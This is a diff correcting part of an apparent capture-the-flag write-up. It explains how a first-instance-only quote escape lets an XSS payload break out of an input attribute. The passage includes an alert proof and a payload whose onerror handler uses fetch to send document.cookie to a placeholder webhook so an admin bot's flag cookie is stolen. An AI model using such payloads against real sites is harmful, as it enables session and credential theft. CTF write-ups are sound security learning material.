@@ -111,17 +111,17 @@ but `replace` only takes care of the first instance of the character in a string
 Knowing all this, and with a bit of trial and error, we can craft a working payload:
 
 ```js
-crewMessage = img"" /><img src=x onerror="alert(1)" x="
+crewMessage = "" /><img src=x onerror="alert(1)" x="
 ```
 
 During serialization:
-- the first `"` in `img""` becomes `&quot;`
-- the second `"` closes the `img` attribute
+- the first `"` in `""` becomes `&quot;`
+- the second `"` closes the `input` attribute
 
 the final markup becomes:
 
 ```js
-<input … placeholder="Update your message: img&quot;"
+<input … placeholder="Update your message: &quot;"
 />
 <img src=x onerror="alert(1)" x=>
 ```
@@ -129,7 +129,7 @@ the final markup becomes:
 Now it's only a matter of adapting it to our purposes:
 
 ```js
-img"" /><img src=x onerror="fetch(\'%s?c=\'+encodeURIComponent(document.cookie))" x="
+"" /><img src=x onerror="fetch(\'%s?c=\'+encodeURIComponent(document.cookie))" x="
 ```
 
 Finally, we encode it into the full URL and send a POST request with the link to the Admin Bot to visit the page and retrieve the flag, which is in the bot's cookies, by forwarding it to our webhook:
